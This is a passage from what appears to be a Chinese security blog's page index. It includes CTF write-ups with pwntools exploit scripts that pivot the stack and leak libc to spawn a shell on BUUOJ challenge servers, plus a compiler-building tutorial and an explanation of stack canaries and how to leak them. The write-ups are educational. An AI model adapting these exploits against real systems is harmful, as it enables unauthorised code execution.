:u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28770</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.1\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.1\"</span>)</span><br><span class=\"line\">sys = elf.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">leave_ret = <span class=\"number\">0x080484b8</span></span><br><span class=\"line\">pld = <span class=\"string\">\"A\"</span>*<span class=\"number\">0x27</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">ebp = uu32(ru(<span class=\"string\">\"\\xff\"</span>,drop=<span class=\"literal\">False</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">leak(<span class=\"string\">\"ebp\"</span>,ebp)</span><br><span class=\"line\">esp = ebp - <span class=\"number\">0x48</span></span><br><span class=\"line\">pld = (<span class=\"string\">b\"A\"</span>*<span class=\"number\">0x4</span> + p32(sys) + p32(main) + p32(esp+<span class=\"number\">0x20</span>) + <span class=\"string\">\"/bin/sh\\x00\"</span> ).ljust(<span class=\"number\">0x28</span>,<span class=\"string\">'A'</span>) + p32(esp+<span class=\"number\">0x10</span>) + p32(leave_ret)</span><br><span class=\"line\">s(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"劫持到bss段\"><a href=\"#劫持到bss段\" class=\"headerlink\" title=\"劫持到bss段\"></a>劫持到bss段</h2><h3 id=\"Black-Watch-入群题-PWN\"><a href=\"#Black-Watch-入群题-PWN\" class=\"headerlink\" title=\"[Black Watch 入群题]PWN\"></a>[Black Watch 入群题]PWN</h3><p><img src=\"/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302221412110.png\" alt=\"image-20210302221412110\"></p>\n<blockquote>\n<p>bss段上可以写，直接迁移到bss段上，然后继续write泄露，getshell</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29456</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.2\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.2\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">bss = <span class=\"number\">0x0804A300</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048408</span></span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">puts = elf.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">pld = p32(<span class=\"number\">0</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">0x4</span>)</span><br><span class=\"line\">sa(<span class=\"string\">\"What is your name?\"</span>,pld)</span><br><span class=\"line\">pld = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class=\"line\">sa(<span class=\"string\">\"What do you want to say?\"</span>,pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = write - libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">pld = p32(<span class=\"number\">0</span>) + p32(sys) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\">sa(<span class=\"string\">\"What is your name?\"</span>,pld)</span><br><span class=\"line\">pld = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class=\"line\">sa(<span class=\"string\">\"What do you want to say?\"</span>,pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"写一个编译器","url":"https://pz1o.top/2021/02/20/写一个编译器/","content":"<p>d当有了这个文件夹，我才有动力把它更完。</p>\n<h1 id=\"0x01-设计\"><a href=\"#0x01-设计\" class=\"headerlink\" title=\"0x01 设计\"></a>0x01 设计</h1><h2 id=\"1-构建流程\"><a href=\"#1-构建流程\" class=\"headerlink\" title=\"1. 构建流程\"></a>1. 构建流程</h2><p>有三个步骤</p>\n<ol>\n<li>词法分析器，用于将字符串转化成内部的表示结构。</li>\n<li>语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li>\n<li>目标代码的生成，将语法树转化成目标代码。</li>\n</ol>\n<p>这里我们的步骤</p>\n<ol>\n<li>构建我们自己的虚拟机以及指令集。这后生成的目标代码便是我们的指令集。</li>\n<li>构建我们的词法分析器</li>\n<li>构建语法分析器</li>\n</ol>\n<h2 id=\"2-编译器框架\"><a href=\"#2-编译器框架\" class=\"headerlink\" title=\"2. 编译器框架\"></a>2. 编译器框架</h2><p>这里有一个单独用于解析“表达式”的函数 <code>expression</code> 是因为表达式在语法分析中相对独立并且比较复杂，所以我们将它单独作为一个模块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> token;            <span class=\"comment\">// current token</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> *src, *old_src;  <span class=\"comment\">// pointer to source code string;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> poolsize;         <span class=\"comment\">// default size of text/data/stack</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">line</span>;             <span class=\"comment\">// line number</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">next</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    token = *src++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">expression</span><span class=\"params\">(<span class=\"keyword\">int</span> level)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// do nothing</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">program</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    next();                  <span class=\"comment\">// get next token</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (token &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"token is: %c\\n\"</span>, token);</span><br><span class=\"line\">        next();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">eval</span><span class=\"params\">()</span> </span>&#123; <span class=\"comment\">// do nothing yet</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i, fd;</span><br><span class=\"line\"></span><br><span class=\"line\">    argc--;</span><br><span class=\"line\">    argv++;</span><br><span class=\"line\"></span><br><span class=\"line\">    poolsize = <span class=\"number\">256</span> * <span class=\"number\">1024</span>; <span class=\"comment\">// arbitrary size</span></span><br><span class=\"line\">    <span class=\"built_in\">line</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((fd = <span class=\"built_in\">open</span>(*argv, <span class=\"number\">0</span>)) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"could not open(%s)\\n\"</span>, *argv);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!(src = old_src = <span class=\"built_in\">malloc</span>(poolsize))) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"could not malloc(%d) for source area\\n\"</span>, poolsize);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// read the source file</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((i = <span class=\"built_in\">read</span>(fd, src, poolsize<span class=\"number\">-1</span>)) &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"read() returned %d\\n\"</span>, i);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    src[i] = <span class=\"number\">0</span>; <span class=\"comment\">// add EOF character</span></span><br><span class=\"line\">    <span class=\"built_in\">close</span>(fd);</span><br><span class=\"line\"></span><br><span class=\"line\">    program();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> eval();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ol>\n<li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li>\n<li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li>\n<li><code>expression(level)</code> 用于解析一个表达式。</li>\n<li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li>\n</ol>\n</blockquote>\n<p>上面代码主要是逐字读取，并输出，接下来我们具体实现每个函数功能。</p>\n<h1 id=\"0x02-虚拟机\"><a href=\"#0x02-虚拟机\" class=\"headerlink\" title=\"0x02 虚拟机\"></a>0x02 虚拟机</h1><p>在计算机中，我们主要关心，内存，CPU，寄存器。</p>\n<p>代码（汇编指令）以二进制的形式保存在内存中；CPU 从中一条条地加载指令执行；程序运行的状态保存在寄存器中。</p>\n<h2 id=\"1-内存\"><a href=\"#1-内存\" class=\"headerlink\" title=\"1. 内存\"></a>1. 内存</h2><p>内存用于存储数据，这里的数据可以是代码，也可以是其它的数据。</p>\n<p>32 位的机器中，我们可以使用的内存地址为 <code>2^32 = 4G</code></p>\n<p>内存中有几个段，在前面程序员自我修养中已经讲过了</p>\n<ol>\n<li>代码段（text）用于存放代码（指令）。</li>\n<li>数据段（data）用于存放初始化了的数据，如<code>int i = 10;</code>，就需要存放到数据段中。</li>\n<li>未初始化数据段（bss）用于存放未初始化的数据，如 <code>int i[1000];</code>，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。</li>\n<li>栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。</li>\n<li>堆（heap）用于为程序动态分配内存。</li>\n</ol>\n","categories":[],"tags":["c"]},{"title":"Linux安全机制","url":"https://pz1o.top/2021/02/19/Linux安全机制/","content":"<h1 id=\"0x01-Canary\"><a href=\"#0x01-Canary\" class=\"headerlink\" title=\"0x01 Canary\"></a>0x01 Canary</h1><p>Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做cookies。Cannry是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出时从低地址到高地址，因此想要攻击成功必须覆盖cannry。</p>\n<h2 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1. 简介\"></a>1. 简介</h2><p>Cannries分为三类，分别是<code>terminator</code> <code>random</code> <code>random XOR</code></p>\n<ul>\n<li><code>Terminator canaries</code>：由于许多栈溢出都是由于字符串操作不当造成的，也就是最后会以<code>\\x00</code>结尾，其实是被截断。所以<code>Terminator canaries</code>将地位设置为<code>\\x00</code>。此外还有截断字符CR(0x0d)、LF(0x0a)、EOF(0xff)</li>\n<li><code>Random canaries</code>：这个通常在程序初始化时随机生成出来，由<code>/dev/urandom</code>生成</li>\n<li><code>Random XOR canaries</code>：与上一个相同，但多了异或操作，相比上一个更难操作。</li>\n</ul>\n<p>gcc参数开启canary</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class=\"line\">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class=\"line\">-fstack-protector-strong</span><br><span class=\"line\">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class=\"line\">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-演示\"><a href=\"#2-演示\" class=\"headerlink\" title=\"2. 演示\"></a>2. 演示</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar buf[10];</span><br><span class=\"line\">\tscanf(&quot;%s&quot;,buf);\t\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ gcc -fstack-protector b.c -o b</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150601689.png\" alt=\"image-20210220150601689\"></p>\n<p>出现错误</p>\n<p>看汇编</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">disassemble main</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150909813.png\" alt=\"image-20210220150909813\"></p>\n<blockquote>\n<p>看两处红框地方，我们可以知道是把一些东西放到rax中，之后又把rax中异或跳转。</p>\n<p>1.fs寄存器是什么？</p>\n<p>fs寄存器被用于存放线程局部存储(Thread Local Stroage,TLS)。TLS是为了避免多个线程同时访问同一全局变量或静态变量所导致的冲突。TLS为每一个使用全局变量的线程提供一个变量值的副本。从全局变量角度看，就是全局变量被克隆了多个副本，每一个副本都可以被一个线程独立改变。而0x28就是stack_guard</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;typedef struct</span><br><span class=\"line\">&gt;&#123;</span><br><span class=\"line\"> void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class=\"line\">                      thread descriptor used by libpthread.  *&#x2F;</span><br><span class=\"line\"> dtv_t *dtv;</span><br><span class=\"line\"> void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class=\"line\"> int multiple_threads;</span><br><span class=\"line\"> uintptr_t sysinfo;</span><br><span class=\"line\"> uintptr_t stack_guard;</span><br><span class=\"line\"> ...</span><br><span class=\"line\">&gt;&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">security_init (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class=\"line\">  <span class=\"comment\">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 设置Canary的值到TLS中</span></span><br><span class=\"line\">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class=\"line\"></span><br><span class=\"line\">  _dl_random = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> THREAD_SET_STACK_GUARD(value) \\</span></span><br><span class=\"line\">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.png\" alt=\"img\"></p>\n<h2 id=\"3-攻击\"><a href=\"#3-攻击\" class=\"headerlink\" title=\"3. 攻击\"></a>3. 攻击</h2><p>攻击有两种思路</p>\n<ol>\n<li>第一种就是泄露canary，然后覆盖</li>\n<li>第二种是同时篡改TLS和栈上的Canary从而绕过检查</li>\n</ol>\n<p>只能一次操作的通常是劫持got表，多次操作的泄露canary</p>\n<h2 id=\"3-1-泄露栈中的-Canary\"><a href=\"#3-1-泄露栈中的-Canary\" class=\"headerlink\" title=\"3.1 泄露栈中的 Canary\"></a>3.1 泄露栈中的 Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>\n<h3 id=\"1-（攻防世界）厦门邀请赛pwn1\"><a href=\"#1-（攻防世界）厦门邀请赛pwn1\" class=\"headerlink\" title=\"1.（攻防世界）厦门邀请赛pwn1\"></a>1.（攻防世界）厦门邀请赛pwn1</h3><p>说一下这个题的思路把</p>\n<ol>\n<li>利用read泄露canary</li>\n<li>64位puts泄露基址</li>\n<li>one_gagdet直接shell</li>\n</ol>\n<p>说一下我的难点</p>\n<blockquote>\n<p>1.第一次做这个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;canary &#x3D; u64(r(7).rjust(8,&#39;\\x00&#39;)) </span><br></pre></td></tr></table></figure>\n<p>要明白是右对齐，也可以这样写</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;canary &#x3D; u64(r(8))-0xa</span><br></pre></td></tr></table></figure>\n<p>具体就是上面讲的原理</p>\n<p>2.sl()和s()区别</p>\n<p>sl()会多发一个’\\n’</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#ontext.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span 